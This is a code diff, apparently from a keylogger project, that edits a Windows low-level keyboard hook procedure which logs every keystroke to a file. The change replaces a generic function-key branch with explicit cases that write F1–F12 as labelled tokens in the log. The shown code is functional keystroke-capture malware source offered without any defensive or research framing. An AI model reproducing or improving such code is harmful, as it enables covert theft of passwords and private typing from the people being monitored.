@@ -51,14 +51,8 @@ LRESULT CALLBACK LowLevelKeyboardProc(INT code, WPARAM wParam, LPARAM lParam)
 				char value[] = { MapVirtualKey(vkey, MAPVK_VK_TO_CHAR) };
 				fputc(value[0], kbpFile);
 			}
-			// 0x70 to 0x87 are func keys
-			else if (vkey >= 0x70 && vkey <= 0x87)
-			{
-				wchar_t value[] = { MapVirtualKey(vkey, MAPVK_VK_TO_CHAR) };
-				fputws(value, kbpFile);
-			}
 			else
-			{
+                        {
 				switch (vkey)
 				{
 				case VK_CANCEL:
@@ -212,6 +206,42 @@ LRESULT CALLBACK LowLevelKeyboardProc(INT code, WPARAM wParam, LPARAM lParam)
 				case VK_RSHIFT:
 					fputs("[rshift]", kbpFile);
 					break;
+                                case VK_F1:
+                                        fputs("[f1]", kbpFile);
+                                        break;
+                                case VK_F2:
+                                        fputs("[f2]", kbpFile);
+                                        break;
+                                case VK_F3:
+                                        fputs("[f3]", kbpFile);
+                                        break;
+                                case VK_F4:
+                                        fputs("[f4]", kbpFile);
+                                        break;
+                                case VK_F5:
+                                        fputs("[f5]", kbpFile);
+                                        break;
+                                case VK_F6:
+                                        fputs("[f6]", kbpFile);
+                                        break;
+                                case VK_F7:
+                                        fputs("[f7]", kbpFile);
+                                        break;
+                                case VK_F8:
+                                        fputs("[f8]", kbpFile);
+                                        break;
+                                case VK_F9:
+                                        fputs("[f9]", kbpFile);
+                                        break;
+                                case VK_F10:
+                                        fputs("[f10]", kbpFile);
+                                        break;
+                                case VK_F11:
+                                        fputs("[f11]", kbpFile);
+                                        break;
+                                case VK_F12:
+                                        fputs("[f12]", kbpFile);
+                                        break;
 				default:
 					break;
 				}
